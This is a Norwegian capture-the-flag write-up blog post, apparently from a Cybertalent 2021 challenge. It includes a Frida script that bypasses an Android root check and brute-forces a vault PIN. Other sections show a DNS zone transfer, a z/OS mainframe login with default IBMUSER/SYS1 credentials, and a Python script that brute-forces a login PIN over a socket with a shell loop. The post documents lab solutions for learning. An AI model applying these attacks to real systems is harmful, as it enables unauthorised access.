+    console<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;info: hooking isroot method&#34;</span>);
+    root_hook<span style="color:#f92672">.</span><span style="color:#f92672">is</span><span style="color:#f92672">.</span>overload(
+      <span style="color:#e6db74">&#34;android.content.Context&#34;</span>
+    )<span style="color:#f92672">.</span>implementation <span style="color:#f92672">=</span> function () {
+      var retnew <span style="color:#f92672">=</span> false;
+      <span style="color:#66d9ef">return</span> retnew;
+    };
+
+    let vault_hook <span style="color:#f92672">=</span> Java<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#34;no.cybertalent.liberatortoolkit.VaultActivity&#34;</span>);
+    let b;
+    const zeroPad <span style="color:#f92672">=</span> (num, places) <span style="color:#f92672">=&gt;</span> String(num)<span style="color:#f92672">.</span>padStart(places, <span style="color:#e6db74">&#34;0&#34;</span>);
+
+    console<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;info: hooking lockerClick&#34;</span>);
+    vault_hook<span style="color:#f92672">.</span>onLockerClick<span style="color:#f92672">.</span>implementation <span style="color:#f92672">=</span> function (x) {
+      console<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;info: entered lockerClick&#34;</span>);
+      let locked <span style="color:#f92672">=</span> this<span style="color:#f92672">.</span>u();
+
+      let a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+      <span style="color:#66d9ef">for</span> (let i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">9999</span>; i<span style="color:#f92672">++</span>) {
+        locked <span style="color:#f92672">=</span> this<span style="color:#f92672">.</span>u();
+        <span style="color:#66d9ef">if</span> (locked) {
+          b <span style="color:#f92672">=</span> zeroPad(i, <span style="color:#ae81ff">4</span>);
+          this<span style="color:#f92672">.</span>onLockerClick(x);
+        } <span style="color:#66d9ef">else</span> {
+          console<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;PIN:&#34;</span> <span style="color:#f92672">+</span> b);
+          <span style="color:#66d9ef">break</span>;
+        }
+      }
+    };
+
+    console<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;info: hooking pin method&#34;</span>);
+    vault_hook<span style="color:#f92672">.</span>t<span style="color:#f92672">.</span>implementation <span style="color:#f92672">=</span> function (s) {
+      console<span style="color:#f92672">.</span>log(b);
+      var ret <span style="color:#f92672">=</span> this<span style="color:#f92672">.</span>t(b);
+      <span style="color:#66d9ef">return</span> ret;
+    };
+  });
+}, <span style="color:#ae81ff">0</span>);
+
+</code></pre></div><p>Kjører scriptet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">frida -U no.cybertalent.liberatortoolkit -l vault_solver.js
+</code></pre></div><p>Finner PIN:5693
+Flag inneholder selvfølgelig flagget for oppgaven.</p>
+<p><img src="/img/vault_pin.png" alt="vault_pin"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~/2_oppdrag$ scoreboard d025828e7d38c133d3224154ae7785b344536761
+Kategori: 2. Oppdrag
+Oppgave:  2.1_beslag_3
+Svar:     d025828e7d38c133d3224154ae7785b344536761
+
+Kanskje det ligger noen interessante filer her?
+</code></pre></div><h3 id="seatheworld">Seatheworld</h3>
+<h4 id="dns">DNS</h4>
+<p>Åpner traffic_log_suspect_3577374.pcap med wireshark, finner to subdomener til seatheworld.tld: ns1 og www.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ host www.seatheworld.tld
+www.seatheworld.tld has address 10.1.15.66
+
+login@corax:~$ curl www.seatheworld.tld
+&lt;!doctype html&gt;
+&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+&lt;head&gt;
+  &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+  &lt;title&gt;Seatheworld!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h2&gt;Down <span style="color:#66d9ef">for</span> maintenance!&lt;/h2&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+login@corax:~$ nmap ns1.seatheworld.tld
+Host is up <span style="color:#f92672">(</span>0.032s latency<span style="color:#f92672">)</span>.
+rDNS record <span style="color:#66d9ef">for</span> 10.1.15.92: c2bc09158754287af3749627eb586e5e_ns1-seatheworld.1.0bbkdb6sbsr5ec49u474vw9l8.c2bc09158754287af3749627eb586e5e_backend
+Not shown: <span style="color:#ae81ff">999</span> closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.29 seconds
+
+login@corax:~$ nmap www.seatheworld.tld
+Host is up <span style="color:#f92672">(</span>0.016s latency<span style="color:#f92672">)</span>.
+rDNS record <span style="color:#66d9ef">for</span> 10.1.15.66: c2bc09158754287af3749627eb586e5e_seatheworld-nginx.1.zmwe3ldbg0qcdgjeoo6kaxnqi.c2bc09158754287af3749627eb586e5e_backend
+Not shown: <span style="color:#ae81ff">999</span> closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.21 seconds
+</code></pre></div><p>Det virker som det ikke er noe spennede som skjer på <a href="http://www.seatheworld.tld">www.seatheworld.tld</a> etter å ha kjørt gobuster på tjenesten og diverse andre scanner. Vi ser nærmere på DNS serveren, og finner alle recordsa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ dig @ns1.seatheworld.tld seatheworld.tld axfr
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u2-Debian &lt;&lt;&gt;&gt; @ns1.seatheworld.tld seatheworld.tld axfr
+; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+;; global options: +cmd
+seatheworld.tld.	600	IN	SOA	ns1.seatheworld.tld. ns1.seatheworld.tld. <span style="color:#ae81ff">12345678</span> <span style="color:#ae81ff">1200</span> <span style="color:#ae81ff">180</span> <span style="color:#ae81ff">1209600</span> <span style="color:#ae81ff">600</span>
+seatheworld.tld.	600	IN	NS	ns1.seatheworld.tld.
+seatheworld.tld.	600	IN	MX	<span style="color:#ae81ff">10</span> mail.seatheworld.tld.
+_flagg.nusse.seatheworld.tld. <span style="color:#ae81ff">600</span> IN	TXT	<span style="color:#e6db74">&#34;9fefa3c8ee83866f2168a6e119ad39b6&#34;</span>
+mail.seatheworld.tld.	600	IN	CNAME	www.seatheworld.tld.
+www.seatheworld.tld.	600	IN	A	10.0.160.75
+seatheworld.tld.	600	IN	A	10.0.160.75
+ns1.seatheworld.tld.	600	IN	A	10.0.160.93
+nusse.seatheworld.tld.	600	IN	A	10.0.160.73
+seatheworld.tld.	600	IN	SOA	ns1.seatheworld.tld. ns1.seatheworld.tld. <span style="color:#ae81ff">12345678</span> <span style="color:#ae81ff">1200</span> <span style="color:#ae81ff">180</span> <span style="color:#ae81ff">1209600</span> <span style="color:#ae81ff">600</span>
+;; Query time: <span style="color:#ae81ff">0</span> msec
+;; SERVER: 10.0.160.93#53<span style="color:#f92672">(</span>10.0.160.93<span style="color:#f92672">)</span>
+;; WHEN: Mon Jan <span style="color:#ae81ff">04</span> 12:09:30 CET <span style="color:#ae81ff">2021</span>
+;; XFR size: <span style="color:#ae81ff">10</span> records <span style="color:#f92672">(</span>messages 1, bytes 450<span style="color:#f92672">)</span>
+
+login@corax:~$ scoreboard 9fefa3c8ee83866f2168a6e119ad39b6
+Kategori: 2. Oppdrag
+Oppgave:  2.2_seatheworld
+Svar:     9fefa3c8ee83866f2168a6e119ad39b6
+
+Bra jobbet!
+Hva kan det være denne maskinen brukes til?  <span style="color:#e6db74">```</span> <span style="color:#75715e">#### Aksess</span>
+
+Vi finner en server som heter nusse.seatheworld.tld fra DNS serveren, la oss se hva som kjører på den:
+
+<span style="color:#e6db74">```</span>bash
+login@corax:~$ nmap -sV -p- nusse.seatheworld.tld
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     IBM OS/390 ftpd V1R10
+22/tcp open  ssh     OpenSSH 3.8.1p1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+23/tcp open  tn3270  IBM Telnet TN3270 <span style="color:#f92672">(</span>TN3270E<span style="color:#f92672">)</span>
+80/tcp open  http    IBM httpd V5R3M0
+Service Info: Host: FTPD1; OS: OS/390; CPE: cpe:/o:ibm:os_390
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 31.07 seconds
+</code></pre></div><p>Her har vi en IBM z/OS mainframe kjørende som backend.
+Sjekker ut nettsiden på port 80, men kommer ikke noe vei der.
+Etter å ha lest litt diverese IBM dokumentasjon om Telnet TN3270 protokollen viser det seg at det trengs en emulator for å tilkoble til serveren med telnet: <a href="http://x3270.bgp.nu/">IBM 3280 terminal emulator</a></p>
+<p>Bruker sshuttle som en slags &ldquo;vpn&rdquo; gjennom ssh forbindelsen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sshuttle --dns -NHr login@ctf.cybertalent.no 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
+</code></pre></div><p>Fyrer opp x3270 og kobler til nusse.seatheworld.tld.</p>
+<p><img src="/img/zos_login.png" alt="zos_login"></p>
+<p>Finner <a href="https://www.ibm.com/support/knowledgecenter/SSB27U_7.1.0/com.ibm.zvm.v710.icha7/icha793.htm">default login</a>
+User: IBMUSER
+Password: SYS1</p>
+<p><img src="/img/zos_aksess.png" alt="zos_aksess"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~<span style="color:#ae81ff">\$</span> scoreboard RETRO_IS_THE_NEW_MODERN
+Kategori: 2. Oppdrag
+Oppgave: 2.2_seatheworld_aksess
+Svar: RETRO_IS_THE_NEW_MODERN
+
+
+Navn på gisseltakerne burde være tilgjengelig et sted på denne stormaskinen.
+</code></pre></div><h4 id="booking">Booking</h4>
+<p>Vi husker kommandoene som står ovenfor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">LOAD IBMUSER.SEATW.LOAD(BOOKING)
+</code></pre></div><p>For å utforske systemet videre bruker vi <a href="https://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zconcepts/zconc_whatisispf.htm">ISPF</a>:</p>
+<p><img src="/img/ispf.png" alt="ispf"></p>
+<p>Jeg bruker en del tid på å lese IBM sin z/OS dokumentasjon og prøver meg litt frem for å lære hvordan en navigerer i Z/OS og hvordan filsystemet fungerer. Denne <a href="https://medium.com/the-technical-archaeologist/hello-world-on-z-os-a0ef31c1e87f">artikkelen</a> hjalp meg mye for å forstå hvordan programmer fungerer på z/OS. Hovedsakelig var det uvant å ha en &ldquo;terminal&rdquo; der det spiller stor rolle hvor på skjermen en skriver kommandoer, det er tydelig at IBM ikke klarte å bestemme seg om z/OS skal være CLI eller GUI.</p>
+<p>For å finne filer på systemet går vi til 3 (Utilites) og 4 (Dslist), da finner vi en menyen vi kan søke etter filer i (eller &ldquo;data sets&rdquo; som det heter i z/OS):</p>
+<p><img src="/img/zos_dlist.png" alt="zos_dlist"></p>
+<p>Vi søker på alle filer under &ldquo;IBMUSER&rdquo;:</p>
+<p><img src="/img/zos_files.png" alt="zos_files"></p>
+<p>Vi er ute etter å finne navnet på gisseltakerne, så vi leter videre i &ldquo;IBMUSER.SEATW.BOOKINGS&rdquo;. Ved å bruke piltastene eller musepekeren til å sette markøren over bookings kan vi trykke enter og få opp denne menyen:</p>
+<p><img src="/img/bookings_menu.png" alt="bookings_menu"></p>
+<p>Hvis vi skriver inn 3 for &ldquo;Browse&rdquo; kan vi bla igjennom filen. Vi vet at gisseltakerne booket et fly 2020-12-14 i følge chatten fra <a href="#chat">Chat-oppgaven</a>. Ved å bruke &ldquo;FIND&rdquo; kommandoen i feltet øverst kan vi finne alle som har bestilt fly den dagen:</p>
+<p><img src="/img/bookings_time.png" alt="bookings_time"></p>
+<p>For å finne neste tilfellet av &ldquo;2020-12-14&rdquo; kan vi trykke F5 for &ldquo;Rfind&rdquo;.</p>
+<p>Alle navn:</p>
+<ul>
+<li>Joe Farnaby (RADAR)</li>
+<li>Eireen Farnaby (eireen89)</li>
+<li>Dillan Cruise (B4tCracK)</li>
+<li>Frank Shorius (hungry_hippo_123)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ scoreboard Joe Farnaby
+Kategori: 2. Oppdrag
+Oppgave:  2.2_seatheworld_booking
+Svar:     Joe Farnaby
+
+Bra jobbet med å identifisere gisseltakerene!
+Mon tro om vi hadde fått enda mer ut av en teknisk tilgang også?
+</code></pre></div><h4 id="ekstra">Ekstra</h4>
+<p>Vi har fortsatt ikke prøvd å kjøre booking-programmet med kommandoen fra login-siden. For å kjøre kommanoden går vi tilbake til hovedsiden til ISPF og velger option 6 (Command). Vi kjører TSO kommandoen:</p>
+<p><img src="/img/tso_load.png" alt="tso_load"></p>
+<p>Flagget printes ikke på grunn av en compile time option. Hvis vi husker fra tidligere var kildekoden tilgjengelig på systemet under &ldquo;IBMUSER.SEATW.SRC&rdquo;. Vi kan åpne z/OS sin Unix terminal og sjekke ut kildekoden derifra. Fra &ldquo;ISPF Command Shell&rdquo; vinduet kan vi bruke omvs for å bruke Unix terminalen på systemet. &ldquo;Data settene&rdquo; fra z/OS er ikke tilgjengelige her, så vi må kopiere de over:</p>
+<p><img src="/img/omvs_copy.png" alt="omvs_copy"></p>
+<p>Bruker oedit for å sjekke ut filen:</p>
+<p><img src="/img/oedit_top.png" alt="oedit_top">
+<img src="/img/oedit_bot.png" alt="oedit_bot"></p>
+<p>Vi kan se at vi må endre SKIP_FLAG til 0 for å printe ut flagget. I tillegg trenger vi en CIPHER fil, den kan kopieres inn på samme måte som kildekoden over. Lager et getflag program med oedit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define SKIP_FLAG 0
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define REC_SIZE 80
+</span><span style="color:#75715e">#define BLOCK_SIZE 1120
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span>
+<span style="color:#a6e22e">print_flag</span>()
+{
+    <span style="color:#66d9ef">char</span>   buf[<span style="color:#ae81ff">512</span>];
+    FILE <span style="color:#f92672">*</span> fd <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;cipher&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    size_t i, n  <span style="color:#f92672">=</span> fread(buf, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">32</span>, fd);
+    fclose(fd);
+    buf[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i<span style="color:#f92672">++</span>)
+        buf[i] <span style="color:#f92672">=</span> buf[i] <span style="color:#f92672">??</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">17</span>; <span style="color:#75715e">/* &#39; */</span>
+    printf(
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">***********************************************&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> FLAG: %s&#34;</span>
+        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">***********************************************</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,
+        buf);
+}
+
+<span style="color:#66d9ef">int</span>
+<span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">if</span> (SKIP_FLAG)
+        printf(
+            <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">***********************************************&#34;</span>
+            <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> FLAG: NOT PRINTING DUE TO COMPILE TIME OPTION&#34;</span>
+            <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">***********************************************</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">else</span>
+        print_flag();
+}
+</code></pre></div><p>Programmet kompileres med vanlig gcc i terminalen og kjøres.
+Flagget blir: c0da14705d803523d572a0480a51d61c</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~<span style="color:#ae81ff">\$</span> scoreboard c0da14705d803523d572a0480a51d61c
+Kategori: 2. Oppdrag
+Oppgave: 2.2_seatheworld_ekstra
+Svar: c0da14705d803523d572a0480a51d61c
+
+Gratulerer! Du har utvist grunnleggende kunnskap om IBM stormaskiner.
+Det er behov <span style="color:#66d9ef">for</span> kunnskap om en rekke forskjellige systemer i en jobb hos oss,
+og evnen til å sette seg inn i nye <span style="color:#f92672">(</span>og gamle!<span style="color:#f92672">)</span> ting er viktig.
+
+En stor takk til IBM Norge som lot oss benytte z/OS <span style="color:#66d9ef">for</span> årets CTF!
+</code></pre></div><h5 id="merk">MERK:</h5>
+<p>Siden FTP porten er åpen og emulatoren støtter fil-overføringer er det mulig å løse oppgavene ved å hente filene over til eget system, men halve morroa her er jo å bruke z/OS!</p>
+<h3 id="scada">Scada</h3>
+<h4 id="onion">Onion</h4>
+<p>Fra vault-oppgaven var det ett notat som het &ldquo;important links&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">IMPORTANT LINKS
+Hidden service URL:
+http://fileserver/files/onion_name.txt
+
+Scada client binary:
+http://fileserver/files/082391170510954df0c28af1ebb9380a
+Rembember this only works on the internal network, not from the outside.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ curl http://fileserver/files/onion_name.txt
+Due to OPSEC, the onion URL must be transitory.
+The onion server is currently located at:
+tpcof2hkjijofpozrtudsgzx64jojhlw4wab6nmuhenhpwtpvrdpb3qd.onion
+</code></pre></div><p>Fyrer opp tor for å besøke siden:
+<img src="/img/onion.png" alt="onion"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">PRO TIP: In case the TOR connection is unstable - you can access this via the hostname &#39;scada&#39; internally App.vue:14:16
+Here is a flag: b4ba373b44abfb94763e54297d3d19d8
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ scoreboard b4ba373b44abfb94763e54297d3d19d8
+Kategori: 2. Oppdrag
+Oppgave:  2.3_onion
+Svar:     b4ba373b44abfb94763e54297d3d19d8
+
+Du har fått tilgang til gisseltakerenes bakdør inn i styringssystemet. Klarer du å styre systemet selv?
+</code></pre></div><h4 id="aksess">Aksess</h4>
+<p>Vi scanner maskinen for porter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> c2bc09158754287af3749627eb586e5e_scada.1.bqspocg7i0ep16oi1ynlzcy98.c2bc09158754287af3749627eb586e5e_backend <span style="color:#f92672">(</span>10.0.124.194<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.00015s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65532</span> closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+1338/tcp open  wmc-log-svc
+1339/tcp open  kjtsiteserver
+</code></pre></div><p>Port 1339 brukes til som websocket til front-end&rsquo;en til &ldquo;onion serveren&rdquo;. Vi ser nærmere på port 1338. Når vi kobler til port 1338 med netcat spør den oss om et brukernavn. Fra <a href="#chat">Chat-oppgaven</a> vet vi at det eksisterer en backdoor et sted, der brukernavnet er første 3 bokstavene fra fornavnet, etterfulgt av lengden av brukernavnet og hele etternavnet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯ nc 10.0.124.194 <span style="color:#ae81ff">1338</span>
+Username: Fra16Shorius
+User access revoked..
+We were unable to log you in..
+</code></pre></div><p>Frank sin bruker sine brukerrettigheter har blitt fjernet, og vi må bruke noen andre sin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc scada <span style="color:#ae81ff">1338</span>
+Username: Eir8Farnaby
+We have now sent a login PIN to you via SMS
+Enter PIN:
+</code></pre></div><p>Lager et python-script for å brute-force pinnen av 3 siffer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.0.124.194&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1338</span>
+
+
+<span style="color:#75715e"># for user in [&#34;Eir8Farnaby&#34;, &#34;Joe5Farnaby&#34;, &#34;Dil8Cruise&#34;]:</span>
+USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Eir8Farnaby&#34;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn_socket</span>(pin_limit):
+    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
+        s<span style="color:#f92672">.</span>connect((HOST, PORT))
+        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)  <span style="color:#75715e"># Username</span>
+        s<span style="color:#f92672">.</span>sendall(USER<span style="color:#f92672">.</span>encode())
+        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)  <span style="color:#75715e"># Enter PIN:</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(pin_limit):
+            pin <span style="color:#f92672">=</span> str(i)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">3</span>)
+            print(<span style="color:#e6db74">&#34;Trying:&#34;</span>, pin, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
+            s<span style="color:#f92672">.</span>sendall(pin<span style="color:#f92672">.</span>encode())
+            data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;the provided PIN was not correct&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>decode():
+                <span style="color:#66d9ef">continue</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;We were unable to log you in..&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>decode():
+                <span style="color:#66d9ef">break</span>
+            print(<span style="color:#e6db74">&#34;Correct pin: &#34;</span>, pin)
+            print(<span style="color:#e6db74">&#34;Received&#34;</span>, data<span style="color:#f92672">.</span>decode())
+            <span style="color:#66d9ef">try</span>:
+                print(<span style="color:#e6db74">&#34;[+] Connected to bind shell!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+                <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+                    cmd <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;(py-shell) $ &#34;</span>)
+                    cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+                    s<span style="color:#f92672">.</span>sendall(cmd<span style="color:#f92672">.</span>encode())
+                    result <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
+                    <span style="color:#66d9ef">if</span> len(result) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+                        print(<span style="color:#e6db74">&#34;[+] Empty response. Dead shell / exited?&#34;</span>)
+                        s<span style="color:#f92672">.</span>close()
+                        <span style="color:#66d9ef">break</span>
+                    print(result)
+
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+                print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] ^C Received, closing connection&#34;</span>)
+                s<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+                print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] ^D Received, closing connection&#34;</span>)
+                s<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">break</span>
+
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    conn_socket(<span style="color:#ae81ff">340</span>)
+
+</code></pre></div><p>Scriptet er helt &ldquo;frankenstein&rdquo; (py-shell koden var bare der som en test i tilfellet vi fikk shell, og hadde egentlig ingen funksjon) og ikke noe godt stykke arbeid, men det fungerer noen ganger. HEHE. Det viser seg også at porten lukker seg etter ca 350 forsøk, så vi prøver bare helt til pinnen er under 350.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python solver.py
+
+...
+...
+
+Trying: <span style="color:#ae81ff">276</span>
+Welcome back!
+
+Correct pin:  <span style="color:#ae81ff">276</span>
+Received b<span style="color:#e6db74">&#39;\nWelcome back!\n&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to bind shell!
+
+<span style="color:#f92672">(</span>py-shell<span style="color:#f92672">)</span> $ uname -r
+Flag: 807bdccb2917e758a5e14f8c0bf48e42
+
+Enter hex-formatted instruction bytes:
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ scoreboard 807bdccb2917e758a5e14f8c0bf48e42
+Kategori: 2. Oppdrag
+Oppgave:  2.3_scada_aksess
+Svar:     807bdccb2917e758a5e14f8c0bf48e42
+
+Godt jobbet! Nå må du bare hjelpe gisselet med å komme seg ut av bygningen!
+</code></pre></div><h4 id="gissel">Gissel</h4>
+<p>Her stoppet jeg med 90% fullført av oppdraget, jeg var utbrent og jeg orket ikke krige videre.</p>
+<p>I siste del går vi over på utfordringene: <strong><a href="/post/etj21_3/">Siste DEL</a></strong></p>
+
+    <h4><a href="/">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+
+    <a href="https://github.com/bashgobrr">github</a> |
+
+&copy;
+
+    bashgobrr
+
+<span id="thisyear">2021</span>
